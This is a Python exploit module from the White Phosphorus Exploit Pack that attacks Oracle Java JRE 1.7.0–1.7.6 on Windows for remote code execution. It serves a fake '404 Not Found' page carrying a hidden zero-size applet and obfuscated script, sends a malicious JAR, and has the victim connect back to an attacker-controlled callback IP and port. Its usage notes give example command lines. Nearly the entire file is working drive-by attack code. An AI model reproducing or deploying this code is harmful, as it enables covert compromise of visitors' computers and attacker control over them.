
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator


NAME = "Oracle Java JRE 1.7.0 -> 1.7.6 Remote Code Execution"
DESCRIPTION = "Exploits a remote code execution vulnerability in Java JRE 7"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Oracle'
DOCUMENTATION["Date public"] = "2012-08-26"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html"
DOCUMENTATION["Notes"] = """
This is a browser based client-side exploit - use it via httpserver.

Confirmed Versions:
Windows Universal + JRE 1.7.0 -> 1.7.6
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is a browser based client-side exploit - use it via httpserver.

Confirmed Versions:
Windows Universal + JRE 1.7.0 -> 1.7.6

------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Oracle Java JRE 1.7.0 -> 1.7.6 Remote Code Execution Remote Code Execution
------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: JRE 1.7.0 -> 1.7.6

Payloads:
0: Java Node

Example:
./commandlineInterface.py -p 5555 -v 15
./3rdparty/White_Phosphorus/exploits/wp_oracle_java_jre7sunawt/wp_oracle_java_jre7sunawt.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["JRE 1.7.0 -> 1.7.6", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit, httpclientside):
    PAYLOADS=["Java Node"]
    
    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.alignstack = True
        self.badstring = "\x00\x09\x0a\x0b\x0c\x0d\x22\x5c"
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.htmlfile=self.filename
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        self.jarfile = 'wp_oracle_java_jre7sunawt.jar'
        self.autoFind = False
        self.refresh_rate = 0
        return

    def is_vulnerable( self, info_dict ):
        major, minor, build, patch = self.getJavaVersions(info_dict)
        self.log("WP> Checking if target is vulnerable. Detected Java version: major=%s, minor=%s, build=%s, patch=%s" % (major, minor, build, patch))
        if not major:
            return 0 
        if major == 1:
            if  minor == 7:
                if patch <= 6:
                    return 81
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return [canvasengine.UNIVERSAL_MOSDEF] 

    def getArgs(self):
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def makedownloadfile(self):
        return file('3rdparty/White_Phosphorus/exploits/wp_oracle_java_jre7sunawt/%s' % self.jarfile, 'rb').read()
        
    def makefile(self):
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <applet archive="%s" code="SiteError.class" width="0" height="0">
                    <param name="host" value="%s">
                    <param name="port" value="%d">
                    <param name="type" value="%d">
                    <param name="id" value="%d">
                </applet>
                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.jarfile,
               self.callback.ip,
               self.callback.port,
               self.engine.getMosdefType(canvasengine.JAVASERVER),
               self.engine.getNewMosdefID(self),
               self.htmlfile) 
        return html

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
    
        self.log('WP> User agent of connecting host: %s' % user_agent)        
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        elif clientheader.URL.count(self.jarfile):
            self.log("WP> Sending JAR")
            data = self.makedownloadfile()
            self.log("WP> Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)
        elif clientheader.URL.count("done"):
            self.log("WP> Did not load Java applet!")
            return None, None
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
